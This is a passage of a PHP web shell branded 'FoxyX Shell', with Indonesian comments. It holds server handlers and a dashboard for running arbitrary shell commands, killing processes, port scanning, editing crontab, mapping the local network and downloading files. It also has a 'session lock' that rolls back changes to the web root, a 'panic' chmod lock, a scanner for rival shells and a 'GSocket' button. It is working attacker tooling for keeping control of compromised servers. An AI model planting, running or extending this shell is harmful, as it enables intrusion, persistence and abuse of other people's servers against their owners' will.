        $root       = $GLOBALS['USER_HOME'] ?? __DIR__;
        $results    = [];
        $totalPhp   = 0;
        shell_finder_scan_dir($root, $selfPath, $results, $totalPhp);
        json_out(true,[
            'root'    => $root,
            'scanned' => $totalPhp,
            'found'   => $results
        ]);
    }

    // ==== PROCESS MANAGER ====
    if($ajax==='ps_list'){
        global $disabledList;
        $os = PHP_OS_FAMILY;
        if($os === 'Windows'){
            $cmd = 'tasklist';
        }else{
            $cmd = 'ps aux';
        }
        $out = diag_run_command($cmd,$disabledList);
        $rows = [];
        $lines = preg_split('/\r?\n/',$out);
        $header = array_shift($lines);
        foreach($lines as $ln){
            $ln = trim($ln);
            if($ln==='') continue;
            if($os==='Windows'){
                // tasklist format: Image Name, PID, Session Name, Session#, Mem Usage
                $parts = preg_split('/\s+/', $ln);
                if(count($parts)<2) continue;
                $rows[] = [
                    'user' => '-',
                    'pid'  => $parts[1],
                    'cpu'  => '-',
                    'mem'  => end($parts),
                    'cmd'  => $parts[0],
                ];
            }else{
                $parts = preg_split('/\s+/', $ln, 11);
                if(count($parts) < 11) continue;
                $rows[] = [
                    'user' => $parts[0],
                    'pid'  => $parts[1],
                    'cpu'  => $parts[2],
                    'mem'  => $parts[3],
                    'cmd'  => $parts[10],
                ];
            }
        }
        json_out(true,['rows'=>$rows,'raw'=>$out]);
    }
    if($ajax==='ps_kill'){
        global $disabledList;
        $pid = intval($_POST['pid'] ?? 0);
        if($pid<=0) json_out(false,['error'=>'PID tidak valid']);
        $os = PHP_OS_FAMILY;
        if($os==='Windows'){
            $cmd = 'taskkill /PID '.intval($pid).' /F';
        }else{
            $cmd = 'kill -9 '.intval($pid);
        }
        $out = diag_run_command($cmd,$disabledList);
        json_out(true,['message'=>"Kill PID $pid dijalankan",'output'=>$out]);
    }

    // ==== PORT SCANNER ====
    if($ajax==='portscan'){
        $host  = trim($_POST['host'] ?? '127.0.0.1');
        $start = intval($_POST['start'] ?? 1);
        $end   = intval($_POST['end'] ?? 1024);
        if($start<1) $start=1;
        if($end>65535) $end=65535;
        if($end<$start) $end=$start;
        if(($end-$start)>512) $end = $start+512; // batasi max 513 port sekali scan

        $open = [];
        $checked = 0;
        for($p=$start;$p<=$end;$p++){
            $errno=0;$errstr='';
            $t1 = microtime(true);
            $fp = @fsockopen($host,$p,$errno,$errstr,0.2);
            $t2 = microtime(true);
            $lat = round(($t2-$t1)*1000,1);
            $checked++;
            if($fp){
                fclose($fp);
                $open[] = ['port'=>$p,'latency_ms'=>$lat];
            }
        }
        json_out(true,[
            'host'=>$host,
            'start'=>$start,
            'end'=>$end,
            'checked'=>$checked,
            'open'=>$open
        ]);
    }

    // ==== CRON MANAGER ====
    if($ajax==='cron_get'){
        global $disabledList;
        $os = PHP_OS_FAMILY;
        if($os==='Windows'){
            $out = diag_run_command('schtasks',$disabledList);
        }else{
            $out = diag_run_command('crontab -l',$disabledList);
            if(stripos($out,'no crontab')!==false) $out = '';
        }
        json_out(true,['os'=>$os,'content'=>$out]);
    }
    if($ajax==='cron_save'){
        global $disabledList, $USER_HOME;
        $content = (string)($_POST['content'] ?? '');
        $os = PHP_OS_FAMILY;
        if($os==='Windows'){
            json_out(false,['error'=>'Edit cron di Windows nggak didukung dari sini (schtasks manual).']);
        }
        $tmp = rtrim($USER_HOME,'/').'/._foxy_crontab.tmp';
        @file_put_contents($tmp,$content);
        $cmd = 'crontab '.escapeshellarg($tmp);
        $out = diag_run_command($cmd,$disabledList);
        json_out(true,['message'=>'Crontab di-update','output'=>$out]);
    }

    // ==== PANIC BUTTON (LOCK HOME) ====
    if($ajax==='panic_lock'){
        @set_time_limit(600);
        recursive_chmod_lock($GLOBALS['USER_HOME']);
        json_out(true,['message'=>'HOME sudah di-lock (dir 0555, file 0444). Hati-hati, banyak script jadi read-only.']);
    }

    // ==== NETWORK TOPOLOGY ====
    if($ajax==='net_topo'){
        global $disabledList;
        $raw = diag_run_command('ip neigh',$disabledList);
        if(trim($raw)==='' || stripos($raw,'command not found')!==false){
            $raw = diag_run_command('arp -a',$disabledList);
        }
        $neighbors = [];
        $lines = preg_split('/\r?\n/',$raw);
        foreach($lines as $ln){
            $ln = trim($ln);
            if($ln==='') continue;
            if(preg_match('~^(\S+)\s+dev\s+(\S+)\s+lladdr\s+([0-9a-f:]+)\s+(\S+)~i',$ln,$m)){
                $neighbors[] = [
                    'ip'    => $m[1],
                    'iface' => $m[2],
                    'mac'   => $m[3],
                    'state' => $m[4],
                ];
            }elseif(preg_match('~\? \(([^)]+)\) at ([0-9a-f:]+) .* on (\S+)~i',$ln,$m)){
                $neighbors[] = [
                    'ip'    => $m[1],
                    'iface' => $m[3],
                    'mac'   => $m[2],
                    'state' => 'ARP',
                ];
            }
        }
        json_out(true,['neighbors'=>$neighbors,'raw'=>$raw]);
    }

    // ==== FILE INTEGRITY CHECKER ====
    if($ajax==='fim_baseline'){
        @set_time_limit(600);
        $res = fim_build_baseline($GLOBALS['USER_HOME'],$GLOBALS['FIM_DB']);
        json_out(true,[
            'message'=>'Baseline FIM dibuat',
            'count'  =>$res['count'],
            'time'   =>date('Y-m-d H:i:s',$res['time'])
        ]);
    }
    if($ajax==='fim_check'){
        @set_time_limit(600);
        $chk = fim_check_changes($GLOBALS['USER_HOME'],$GLOBALS['FIM_DB']);
        if($chk===null) json_out(false,['error'=>'Baseline belum ada / corrupt.']);
        // limit output supaya nggak kebangetan
        $limit = 200;
        $added    = array_slice($chk['added'],0,$limit);
        $deleted  = array_slice($chk['deleted'],0,$limit);
        $modified = array_slice($chk['modified'],0,$limit);
        json_out(true,[
            'baseline_time'=>date('Y-m-d H:i:s',$chk['baseline_time']),
            'total_baseline'=>$chk['total_baseline'],
            'total_current' =>$chk['total_current'],
            'added_count'   =>count($chk['added']),
            'deleted_count' =>count($chk['deleted']),
            'modified_count'=>count($chk['modified']),
            'added'         =>$added,
            'deleted'       =>$deleted,
            'modified'      =>$modified,
        ]);
    }

    // ==== LOCK SESSION TOGGLE ====
    if($ajax==='session_lock'){
        $action = $_POST['action'] ?? 'status';
        $state  = session_load_state($GLOBALS['SESSION_DB']);
        if($action==='status'){
            json_out(true,['locked'=>!empty($state['locked'])]);
        }elseif($action==='lock'){
            if(!empty($state['locked'])){
                json_out(true,['locked'=>true,'message'=>'Session sudah di-lock']);
            }
            @set_time_limit(600);
            session_take_snapshot(FOX_SESSION_ROOT,$GLOBALS['SESSION_SNAP_DIR']);
            $state = ['locked'=>true,'snapshot'=>$GLOBALS['SESSION_SNAP_DIR']];
            session_save_state($GLOBALS['SESSION_DB'],$state);
            json_out(true,['locked'=>true,'message'=>'Session di-lock, snapshot dibuat. Semua perubahan di webroot akan di-rollback tiap request.']);
        }elseif($action==='unlock'){
            $state = ['locked'=>false,'snapshot'=>null];
            session_save_state($GLOBALS['SESSION_DB'],$state);
            if(is_dir($GLOBALS['SESSION_SNAP_DIR'])) recursive_delete($GLOBALS['SESSION_SNAP_DIR']);
            json_out(true,['locked'=>false,'message'=>'Session unlock. Snapshot dibersihkan.']);
        }else{
            json_out(false,['error'=>'Action tidak dikenal']);
        }
    }

    // ==== LOCK SESSION REALTIME (SSE) ====
if($ajax==='session_lock_stream'){
    $action = $_GET['action'] ?? 'lock';
    @set_time_limit(600);

    sse_start();

    // ping awal biar koneksi kebuka
    sse_send('status', ['msg'=>'Starting...', 'pct'=>0]);

    $state = session_load_state($GLOBALS['SESSION_DB']);

    if($action === 'unlock'){
        $state = ['locked'=>false,'snapshot'=>null];
        session_save_state($GLOBALS['SESSION_DB'],$state);
        if(is_dir($GLOBALS['SESSION_SNAP_DIR'])) recursive_delete($GLOBALS['SESSION_SNAP_DIR']);

        sse_send('done', [
            'locked'=>false,
            'message'=>'Session unlock. Snapshot dibersihkan.',
            'pct'=>100
        ]);
        exit;
    }

    // action lock
    if(!empty($state['locked'])){
        sse_send('done', [
            'locked'=>true,
            'message'=>'Session sudah di-lock.',
            'pct'=>100
        ]);
        exit;
    }

    sse_send('status', ['msg'=>'Counting files...', 'pct'=>1]);

    $res = session_take_snapshot_stream(FOX_SESSION_ROOT, $GLOBALS['SESSION_SNAP_DIR'], function($p){
        // kirim progress realtime
        sse_send('progress', [
            'pct'    => $p['pct'],
            'done'   => $p['done'],
            'total'  => $p['total'],
            'current'=> $p['current']
        ]);
    });

    $state = ['locked'=>true,'snapshot'=>$GLOBALS['SESSION_SNAP_DIR']];
    session_save_state($GLOBALS['SESSION_DB'],$state);

    sse_send('done', [
        'locked'=>true,
        'message'=>'Session di-lock, snapshot dibuat. Semua perubahan di webroot akan di-rollback tiap request.',
        'pct'=>100,
        'total'=>$res['total'] ?? null,
        'done'=>$res['done'] ?? null
    ]);
    exit;
}


    json_out(false,['error'=>'Aksi AJAX tidak dikenal']);
}

// ============= DOWNLOAD ACTION =============
$action = $_GET['action'] ?? '';
if($action==='download' && isset($_GET['file'])){
    $fn = basename($_GET['file']);
    $fp = $currentDir.DIRECTORY_SEPARATOR.$fn;
    if(file_exists($fp)){
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($fp).'"');
        header('Expires:0');
        header('Cache-Control:must-revalidate');
        header('Pragma:public');
        header('Content-Length:'.filesize($fp));
        readfile($fp);
    }else{
        echo "File tidak ditemukan.";
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="id" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>FoxyX Shell</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        :root{--bg-main:#020617;}
        body{
            background:radial-gradient(circle at top,#0b1220 0,#020617 55%,#000 100%);
            color:#fff;
        }
        .text-slate-100{color:#f9fafb;}
        .text-slate-200{color:#e5e7eb;}
        .text-slate-300{color:#d1d5db;}
        .text-slate-400{color:#9ca3af;}
        .text-slate-500{color:#6b7280;}
        .bg-slate-800{background-color:#1f2937;}
        .bg-slate-900{background-color:#111827;}
        .border-slate-700{border-color:#374151;}
        .border-slate-800{border-color:#1f2937;}

        .glass-card{
            background:linear-gradient(145deg,rgba(15,23,42,.96),rgba(15,23,42,.99));
            border-radius:.9rem;
            border:1px solid rgba(129,140,248,.35);
            box-shadow:0 18px 45px rgba(15,23,42,.9);
        }
        #file-grid{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
            gap: 0.75rem;
        }
        @media (min-width: 1536px){
            #file-grid{
                grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
            }
        }
        .file-card{
            min-width:210px;
            border-radius:.9rem;
            border:1px solid rgba(148,163,184,.35);
            background:rgba(15,23,42,.96);
            box-shadow:0 0 0 1px rgba(15,23,42,.9);
            transition:border-color .15s, box-shadow .15s, transform .15s;
        }
        .file-card:hover{
            border-color:rgba(56,189,248,.9);
            box-shadow:0 0 0 1px rgba(56,189,248,.55);
            transform:translateY(-1px);
        }
        .file-card:focus-within{
            border-color:rgba(129,140,248,.95);
            box-shadow:0 0 0 1px rgba(129,140,248,.7);
        }

        .file-icon{
            width:42px;height:42px;border-radius:.9rem;
            display:flex;align-items:center;justify-content:center;
            background:radial-gradient(circle at top left,#38bdf8,#0f172a 65%);
        }
        .file-icon-folder{
            background:radial-gradient(circle at top left,#22c55e,#0f172a 65%);
        }
        .badge-lock{
            font-size:.6rem;padding:.2rem .5rem;border-radius:999px;
            background:rgba(248,113,113,.15);
            border:1px solid rgba(248,113,113,.9);
            color:#fee2e2;
        }
        .pill-btn{
            border-radius:999px;
            padding:.45rem 1.1rem;
            font-size:.75rem;
            font-weight:600;
        }
        .pill-btn-primary{
            background:linear-gradient(135deg,#0ea5e9,#6366f1);
            box-shadow:0 10px 25px rgba(56,189,248,.35);
            color:#fff;
        }
        .pill-btn-primary:hover{filter:brightness(1.06);}
        .pill-btn-ghost{
            border-radius:999px;
            padding:.45rem 1.1rem;
            font-size:.75rem;
            font-weight:600;
            background:rgba(15,23,42,.9);
            border:1px solid rgba(148,163,184,.6);
            color:#f9fafb;
        }
        .pill-btn-ghost:hover{
            border-color:#0ea5e9;
            color:#fff;
        }

        .modal-backdrop{
            position:fixed;inset:0;background:rgba(0,0,0,.7);
            display:none;align-items:center;justify-content:center;z-index:50;
        }
        .modal-backdrop.show{display:flex;}
        #yt-player{
            position:absolute;width:1px;height:1px;opacity:0;
            pointer-events:none;left:-9999px;top:-9999px;
        }

        .music-card{
            background:radial-gradient(circle at top,#020824,#020617);
            border-radius:1rem;
            border:1px solid rgba(96,165,250,.45);
            box-shadow:0 18px 45px rgba(15,23,42,.9);
        }
        .music-disc-wrap{
            width:80px;height:80px;border-radius:999px;
            background:radial-gradient(circle at 30% 20%,#38bdf8,#4f46e5 40%,#020617 65%);
            box-shadow:0 0 0 8px rgba(37,99,235,.3);
            display:flex;align-items:center;justify-content:center;
        }
        .music-disc-inner{
            width:56px;height:56px;border-radius:999px;
            background:radial-gradient(circle,#020617 0,#020617 35%,#1d4ed8 70%,#020617 100%);
            border:4px solid rgba(56,189,248,.4);
            position:relative;
        }
        .music-disc-inner::after{
            content:"";position:absolute;inset:37%;border-radius:999px;
            background:#020617;
            box-shadow:0 0 0 2px rgba(148,163,184,.6);
        }
        .music-control-btn{
            width:32px;height:32px;border-radius:999px;
            background:rgba(15,23,42,.95);
            border:1px solid rgba(148,163,184,.6);
            display:flex;align-items:center;justify-content:center;
            font-size:14px;
            transition:.15s;
            color:#e5e7eb;
        }
        .music-control-btn.main{
            width:38px;height:38px;
            background:linear-gradient(135deg,#38bdf8,#6366f1);
            border:none;color:#fff;
            box-shadow:0 8px 20px rgba(37,99,235,.6);
        }
        .music-control-btn:hover{
            transform:translateY(-1px);
            border-color:#38bdf8;
            color:#fff;
        }
        .music-timeline{
            height:3px;border-radius:999px;
            background:rgba(15,23,42,1);
            overflow:hidden;
        }
        .music-timeline-bar{
            height:100%;
            background:linear-gradient(90deg,#38bdf8,#6366f1,#22c55e);
            width:0%;
        }
        .playlist-row{
            display:flex;align-items:center;
            padding:.3rem .55rem;
            border-radius:.6rem;
            font-size:.72rem;
            margin-top:.15rem;
        }
        .playlist-row.active{
            background:linear-gradient(135deg,rgba(56,189,248,.25),rgba(129,140,248,.45));
            border:1px solid rgba(129,140,248,.9);
            color:#fff;
        }
        .playlist-row .idx{
            width:18px;text-align:center;
            font-size:.7rem;color:#cbd5f5;
        }
        .playlist-row .icon{
            margin:0 .5rem;
        }
        .playlist-row .title{
            flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
        }
        .playlist-row.inactive{
            color:#cbd5f5;
        }
        .playlist-row:hover{
            background:rgba(15,23,42,.9);
            border:1px solid rgba(99,102,241,.7);
            cursor:pointer;
        }
    </style>
</head>
<body class="min-h-screen">
<div class="min-h-screen flex flex-col">

<header class="border-b border-slate-800 bg-slate-950 bg-opacity-95 backdrop-blur">
    <div class="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
        <div class="flex items-center space-x-3">
            <div class="w-8 h-8 rounded-lg bg-gradient-to-tr from-sky-400 via-indigo-500 to-amber-400 flex items-center justify-center shadow-lg shadow-sky-500/40">
                <span class="text-xs font-black tracking-tight text-white">G</span>
            </div>
            <div>
                <div class="flex items-center space-x-2">
                    <span class="font-semibold text-sm md:text-base tracking-wide text-white">FoxyX Shell</span>
                    <span class="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500 bg-opacity-15 border border-emerald-500 text-emerald-200">
                        PROTECTED
                    </span>
                    <?php if(!empty($SESSION_STATE['locked'])): ?>
                    <span class="text-[10px] px-2 py-0.5 rounded-full bg-red-500 bg-opacity-20 border border-red-400 text-red-200">
                        SESSION LOCKED
                    </span>
                    <?php endif; ?>
                </div>
                <div class="text-[10px] text-slate-200 flex items-center space-x-1">
                    <span class="hidden sm:inline">Current path :</span>
                    <span class="truncate max-w-xs md:max-w-md text-sky-200" id="current-path-label">
                        <?= htmlspecialchars($currentDir) ?>
                    </span>
                </div>
            </div>
        </div>
        <div class="hidden md:flex items-center space-x-4 text-[11px]">
            <div class="flex flex-col text-right">
                <span class="text-slate-200">Server IP</span>
                <span class="text-white font-mono"><?= htmlspecialchars($serverIp) ?></span>
            </div>
            <div class="flex flex-col text-right">
                <span class="text-slate-200">Your IP</span>
                <span class="text-white font-mono"><?= htmlspecialchars($clientIp) ?></span>
            </div>
            <div class="flex flex-col text-right">
                <span class="text-slate-200">PHP</span>
                <span class="text-sky-200 font-semibold"><?= htmlspecialchars($phpVersion) ?></span>
            </div>
            <a href="?logout=1" class="pill-btn pill-btn-primary inline-flex items-center space-x-1 text-xs">
                <span>⏻</span><span>Logout</span>
            </a>
        </div>
    </div>
</header>

<main class="flex-1">
    <div class="max-w-7xl mx-auto px-4 py-5 lg:flex lg:space-x-4">
        <!-- MAIN area -->
        <section class="flex-[3] space-y-4">
            <div class="lg:flex lg:space-x-4 space-y-4 lg:space-y-0">
                <!-- MUSIC -->
                <div class="w-full lg:w-72">
                    <div class="music-card p-4 text-white">
                        <div class="flex items-center justify-between mb-3">
                            <div class="flex items-center space-x-2">
                                <span>🎵</span>
                                <h2 class="text-xs font-semibold tracking-wide uppercase">FoxyX Music</h2>
                            </div>
                            <span class="text-[10px] px-2 py-0.5 rounded-full bg-sky-500 bg-opacity-15 border border-sky-500 text-sky-200">
                                AUTO LOOP
                            </span>
                        </div>

                        <div class="text-[10px] text-indigo-300 mb-1 tracking-[0.2em] uppercase">Now Playing</div>

                        <div class="flex items-center space-x-4 mb-4">
                            <div class="music-disc-wrap">
                                <div class="music-disc-inner"></div>
                            </div>
                            <div class="flex-1">
                                <div id="music-title" class="text-xs font-semibold text-white truncate">
                                    Loading playlist...
                                </div>
                                <div id="music-subtitle" class="text-[10px] text-slate-300">
                                    Waiting...
                                </div>
                            </div>
                        </div>

                        <div class="flex items-center justify-center space-x-3 mb-4">
                            <button id="music-prev" class="music-control-btn">
                                <img src="https://cdn-icons-png.flaticon.com/512/6878/6878691.png" alt="Prev" class="w-4 h-4">
                            </button>
                            <button id="music-play" class="music-control-btn main">
                                <img id="music-play-icon" src="https://cdn-icons-png.flaticon.com/512/6878/6878705.png" alt="Play" class="w-4 h-4">
                            </button>
                            <button id="music-next" class="music-control-btn">
                                <img src="https://cdn-icons-png.flaticon.com/512/6878/6878692.png" alt="Next" class="w-4 h-4">
                            </button>
                        </div>

                        <div class="mb-2">
                            <div class="music-timeline">
                                <div id="music-progress" class="music-timeline-bar"></div>
                            </div>
                            <div class="flex justify-between text-[10px] text-slate-300 mt-1">
                                <span id="music-time-start">00:00</span>
                                <span id="music-time-end">00:00</span>
                            </div>
                        </div>

                        <div class="mt-3 space-y-1 text-[11px]" id="playlist">
                            <!-- rows injected by JS -->
                        </div>
                    </div>
                </div>

                <!-- FILE MANAGER -->
                <div class="flex-1 space-y-4">
                    <!-- TOOLBAR -->
                    <div class="glass-card px-4 py-3">
                        <div class="flex flex-wrap items-center justify-between gap-3">
                            <div class="flex items-center space-x-2 text-[11px]">
                                <span class="w-1.5 h-6 rounded-full bg-gradient-to-b from-sky-400 to-indigo-500"></span>
                                <div>
                                    <div class="text-xs font-semibold text-white">File Manager</div>
                                    <div class="text-[10px] text-slate-200">Kelola file &amp; folder langsung dari server</div>
                                </div>
                            </div>
                            <div class="flex flex-wrap items-center gap-2">
                                <button type="button"
                                    class="pill-btn pill-btn-primary text-xs btn-upload flex items-center space-x-1">
                                    <img src="https://cdn-icons-png.flaticon.com/128/17032/17032830.png" alt="Upload" class="w-4 h-4">
                                    <span>Upload</span>
                                </button>
                                <button type="button"
                                    class="pill-btn pill-btn-ghost text-xs btn-new flex items-center space-x-1">
                                    <img src="https://cdn-icons-png.flaticon.com/128/3735/3735045.png" alt="New" class="w-4 h-4">
                                    <span>New File/Folder</span>
                                </button>
                                <button type="button"
                                    class="pill-btn pill-btn-ghost text-xs btn-bulkcopy flex items-center space-x-1">
                                    <span>📦</span><span>Bulk Copy</span>
                                </button>
                                <button type="button"
                                    class="pill-btn pill-btn-ghost text-xs btn-gsocket flex items-center space-x-1">
                                    <span>⚡</span><span>GSocket</span>
                                </button>
                                <button type="button"
                                    class="pill-btn pill-btn-ghost text-xs btn-shellfinder flex items-center space-x-1">
                                    <span>🕵️</span><span>Shell Finder</span>
                                </button>
                                <button type="button"
                                    class="pill-btn pill-btn-ghost text-xs btn-process flex items-center space-x-1">
                                    <span>🧠</span><span>Process</span>
                                </button>
                                <button type="button"
                                    class="pill-btn pill-btn-ghost text-xs btn-portscan flex items-center space-x-1">
                                    <span>🔌</span><span>Port Scan</span>
                                </button>
                                <button type="button"
                                    class="pill-btn pill-btn-ghost text-xs btn-cron flex items-center space-x-1">
                                    <span>⏱</span><span>Cron</span>
                                </button>
                                <button type="button"
                                    class="pill-btn pill-btn-ghost text-xs btn-topology flex items-center space-x-1">
                                    <span>🌐</span><span>Net Topology</span>
                                </button>
                                <button type="button"
                                    class="pill-btn pill-btn-ghost text-xs btn-fim flex items-center space-x-1">
                                    <span>🛡</span><span>FIM</span>
                                </button>
                                <button type="button"
                                    class="pill-btn pill-btn-ghost text-xs btn-sessionlock flex items-center space-x-1">
                                    <span>🔒</span><span id="sessionlock-label">Lock Session</span>
                                </button>
                                <button type="button"
                                    class="pill-btn pill-btn-ghost text-xs btn-panic flex items-center space-x-1 border-red-500 text-red-200">
                                    <span>🧨</span><span>Panic</span>
                                </button>
                            </div>
                        </div>
                    </div>

                    <!-- BREADCRUMB -->
                    <nav class="glass-card px-4 py-3">
                        <div class="flex items-center justify-between text-[11px]">
                            <div class="flex items-center space-x-2">
                                <span class="text-slate-200">Path</span>
                                <div class="text-white" id="breadcrumb">
                                    <?= breadcrumb_html($currentDir) ?>
                                </div>
                            </div>
                            <div class="hidden sm:flex items-center space-x-2 text-[10px] text-slate-200">
                                <span>Home dir :</span>
                                <span class="text-sky-200 font-mono truncate max-w-[200px]"><?= htmlspecialchars($USER_HOME) ?></span>
                            </div>
                        </div>
                    </nav>

                    <!-- FILE LIST -->
                    <div class="glass-card p-4 text-white">
                        <?php if(is_locked_path($currentDir,$locks)): ?>
                            <div class="mb-3 text-xs bg-yellow-500 bg-opacity-10 border border-yellow-400 text-yellow-100 px-3 py-2 rounded">
                                ⚠ Direktori ini LOCK, aksi write/delete ditolak.
                            </div>
                        <?php endif; ?>
                        <div id="file-grid" class="grid gap-3 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-6">
                            <?php render_file_cards($currentDir,$locks); ?>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- SIDEBAR -->
        <aside class="w-full lg:w-72 space-y-4 mt-4 lg:mt-0">

            <!-- SYSTEM INFO -->
            <div class="glass-card p-4 text-white">
                <div class="flex items-center justify-between mb-3">
                    <h2 class="text-xs font-semibold tracking-wide uppercase">SYSTEM INFO</h2>
                    <span class="text-[10px] px-2 py-0.5 rounded-full bg-slate-800 text-slate-200 border border-slate-700">
                        SERVER
                    </span>
                </div>
                <dl class="space-y-2 text-xs">
                    <div class="flex justify-between"><dt class="text-slate-200">Server IP</dt><dd class="text-white"><?= htmlspecialchars($serverIp) ?></dd></div>
                    <div class="flex justify-between"><dt class="text-slate-200">Your IP</dt><dd class="text-white"><?= htmlspecialchars($clientIp) ?></dd></div>
                    <div class="flex justify-between"><dt class="text-slate-200">Server</dt><dd class="text-white truncate text-right"><?= htmlspecialchars($serverSoftware) ?></dd></div>
                    <div class="flex justify-between"><dt class="text-slate-200">System</dt><dd class="text-white truncate text-right"><?= htmlspecialchars($osVersion) ?></dd></div>
                    <div class="flex justify-between"><dt class="text-slate-200">User</dt><dd class="text-white"><?= htmlspecialchars($currentUser) ?></dd></div>
                    <div class="flex justify-between"><dt class="text-slate-200">PHP</dt><dd class="text-sky-200 font-semibold"><?= htmlspecialchars($phpVersion) ?></dd></div>
                </dl>

                <div class="mt-4 pt-3 border-t border-slate-700">
                    <div class="text-[10px] text-slate-300 mb-1">Exec Functions</div>
                    <div class="space-y-1 text-[11px]">
                        <div class="flex justify-between"><span>exec()</span><span class="font-mono <?= $execStatus==='Disabled'?'text-red-300':'text-emerald-300' ?>"><?= htmlspecialchars($execStatus) ?></span></div>
                        <div class="flex justify-between"><span>shell_exec()</span><span class="font-mono <?= $shellExecStatus==='Disabled'?'text-red-300':'text-emerald-300' ?>"><?= htmlspecialchars($shellExecStatus) ?></span></div>
                        <div class="flex justify-between"><span>popen()</span><span class="font-mono <?= $popenStatus==='Disabled'?'text-red-300':'text-emerald-300' ?>"><?= htmlspecialchars($popenStatus) ?></span></div>
                        <div class="flex justify-between"><span>proc_open()</span><span class="font-mono <?= $procOpenStatus==='Disabled'?'text-red-300':'text-emerald-300' ?>"><?= htmlspecialchars($procOpenStatus) ?></span></div>
                    </div>
                </div>

                <div class="mt-3">
                    <div class="text-[10px] text-slate-300 mb-1">PHPMailer</div>
                    <div class="flex justify-between text-[11px]">
                        <span>Class</span>
                        <span class="font-mono <?= $phpmailerStatus==='Found'?'text-emerald-300':'text-red-300' ?>"><?= htmlspecialchars($phpmailerStatus) ?></span>
                    </div>
                </div>

                <div class="mt-4">
                    <div class="flex justify-between text-[10px] text-slate-200 mb-1">
                        <span>Disk Usage</span>
                        <span><?= fmt_bytes($diskUsed) ?> / <?= fmt_bytes($diskTotal) ?></span>
                    </div>
                    <div class="w-full h-2 rounded-full bg-slate-900 overflow-hidden">
                        <div class="h-full bg-gradient-to-r from-sky-400 via-indigo-500 to-amber-400" style="width:<?= max(0,min(100,$diskPct)) ?>%;"></div>
                    </div>
                    <div class="mt-1 text-[10px] text-slate-200 flex justify-between">
                        <span>Used: <?= $diskPct ?>%</span>
                        <span>Free: <?= fmt_bytes($diskFree) ?></span>
                    </div>
                </div>
            </div>

            <!-- DIAGNOSTIC PANEL -->
            <div class="glass-card p-4 text-white">
                <div class="flex items-center justify-between mb-3">
                    <h2 class="text-xs font-semibold tracking-wide uppercase">Diagnostics</h2>
                    <span class="text-[10px] px-2 py-0.5 rounded-full bg-slate-800 text-slate-200 border border-slate-700">
                        FULL SHELL
                    </span>
                </div>
                <div class="space-y-2 text-[11px]">
                    <label class="block text-slate-200 mb-1">Command</label>
                    <input id="diag-input" type="text"
                        class="w-full bg-slate-900 border border-slate-700 rounded px-2 py-1 text-[11px]"
                        placeholder="contoh: ls -la /home">
                    <button id="diag-run" type="button" class="pill-btn pill-btn-primary text-[11px] mt-1 w-full">
                        Run Command
                    </button>
                    <div class="mt-2 text-[10px] text-slate-300">
                        Command akan dijalankan langsung di shell server. Hati-hati.
                    </div>
                    <pre id="diag-output" class="mt-2 bg-slate-900 border border-slate-800 rounded p-2 text-[10px] text-slate-100 overflow-auto max-h-48 whitespace-pre-wrap">
&gt; (belum ada output)
                    </pre>
                </div>
            </div>

        </aside>
    </div>
</main>
</div>

<!-- hidden YT -->
<div id="yt-player"></div>

<!-- MODAL -->
<div id="modal-backdrop" class="modal-backdrop">
    <div class="glass-card w-full max-w-2xl mx-4">
        <div class="flex items-center justify-between px-4 pt-4 pb-2 border-b border-slate-700">
            <h3 id="modal-title" class="text-sm font-semibold text-white">Modal</h3>
            <button type="button" id="modal-close" class="text-slate-300 hover:text-white text-lg leading-none">×</button>
        </div>
        <form id="modal-form" class="px-4 pt-3 pb-4 space-y-3 text-xs">
            <div id="modal-message" class="hidden text-[11px]"></div>
            <div id="modal-body"></div>
            <div class="flex items-center justify-end space-x-2 pt-2">
                <button type="button" id="modal-cancel" class="pill-btn pill-btn-ghost text-xs">Batal</button>
                <button type="submit" id="modal-submit" class="pill-btn pill-btn-primary text-xs">Save</button>
            </div>
        </form>
    </div>
</div>

<!-- PROGRESS MODAL (REALTIME) -->
<div id="progress-backdrop" class="modal-backdrop">
  <div class="glass-card w-full max-w-lg mx-4">
    <div class="flex items-center justify-between px-4 pt-4 pb-2 border-b border-slate-700">
      <div class="flex items-center space-x-2">
        <div class="spin"></div>
        <h3 class="text-sm font-semibold text-white" id="progress-title">Processing...</h3>
      </div>
      <button type="button" id="progress-close" class="text-slate-300 hover:text-white text-lg leading-none">×</button>
    </div>
    <div class="px-4 pt-3 pb-4 text-xs">
      <div class="flex items-center justify-between mb-2">
        <div class="text-slate-200" id="progress-text">Preparing...</div>
        <div class="font-mono text-sky-200" id="progress-pct">0%</div>
      </div>

      <div class="progress-wrap mb-3">
        <div class="progress-bar" id="progress-bar"></div>
      </div>

      <div class="text-[11px] text-slate-300 mb-2">
        <span id="progress-count">0 / 0</span>
      </div>

      <div class="bg-slate-900 border border-slate-700 rounded p-2 text-[10px] text-slate-200 max-h-28 overflow-auto whitespace-pre-wrap">
        <div class="text-slate-400 mb-1">Current:</div>
        <div id="progress-current" class="font-mono text-sky-200">-</div>
      </div>

      <div class="mt-3 text-[10px] text-slate-400">
        Jangan close tab saat proses berjalan. Ini progress realtime dari server.
      </div>
    </div>
  </div>
</div>


<script src="https://www.youtube.com/iframe_api"></script>
<script>
(function(){
    const modalBackdrop=document.getElementById('modal-backdrop');
    const modalTitle=document.getElementById('modal-title');
    const modalBody=document.getElementById('modal-body');
    const modalForm=document.getElementById('modal-form');
    const modalSubmit=document.getElementById('modal-submit');
    const modalMessage=document.getElementById('modal-message');
    const btnClose=document.getElementById('modal-close');
    const btnCancel=document.getElementById('modal-cancel');
    const fileGrid=document.getElementById('file-grid');
    const pathLabel=document.getElementById('current-path-label');
    const breadcrumbEl=document.getElementById('breadcrumb');

    const musicTitle=document.getElementById('music-title');
    const musicSubtitle=document.getElementById('music-subtitle');
    const musicPrev=document.getElementById('music-prev');
    const musicPlayBtn=document.getElementById('music-play');
    const musicPlayIcon=document.getElementById('music-play-icon');
